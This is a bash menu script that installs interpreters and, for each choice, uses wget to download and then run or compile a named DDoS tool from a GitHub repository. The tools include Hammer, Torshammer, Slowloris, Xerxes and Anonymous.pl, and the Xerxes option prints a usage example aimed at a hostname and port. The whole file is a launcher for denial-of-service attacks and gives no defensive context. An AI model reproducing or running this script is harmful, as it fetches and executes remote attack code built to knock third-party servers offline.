
#!/bin/bash
  
";PS3='Select an option [1-9] Then Press ENTER: '
options=("DDos Hammer" "DDos Toshammer" "DDos HotSent" "DDos Stable" "DDos Slowloris" "DDos Xerxes" "DDos Fire" "DDos Anonymous.pl"  "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "DDos Hammer")
	apt -y install python
 wget https://raw.githubusercontent.com/maellambong/DDos/master/tool/hammer.py
   python hammer.py
        break
            ;;
   "DDos Toshammer")
     apt install python2 -y
 wget  https://raw.githubusercontent.com/maellambong/DDos/master/tool/torshammer.py
   python2 torshammer.py
      break
      ;;
"DDos HotSent")
  apt install python2 -y
	wget https://raw.githubusercontent.com/maellambong/DDos/master/tool/ddos2.py
	python2 ddos2.py 
    break
	;;
	"DDos Stable")
	apt install python2 -y
	wget https://raw.githubusercontent.com/maellambong/DDos/master/tool/ddos.py
	python2 ddos.py 
  break
	;;
	"DDos Slowloris")
apt install python2 -y
wget https://raw.githubusercontent.com/maellambong/DDos/master/pyloris.py
python2 pyloris.py
	break 
	;;
	"DDos Xerxes")
	apt install clang -y 
	wget https://raw.githubusercontent.com/maellambong/DDos/master/xerxes.c
	clang xerxes.c -o xerxes
	echo " example ./xerxes hostname 80"
	break
	;;
	"DDos Fire")
	apt install python2 -y
	  wget https://raw.githubusercontent.com/maellambong/DDos/master/MR.A
	python2 MR.A
	   break
	    ;;
	"DDos Anonymous.pl")
	apt install perl
	wget https://raw.githubusercontent.com/maellambong/DDos/master/perl/Anonymous.pl
	perl Anonymous.pl
	  break
	    ;;        
	"Quit")
	exit
	break
	;;
	 
        *) echo invalid option;
	esac
done 







	  
	 

	  
	 
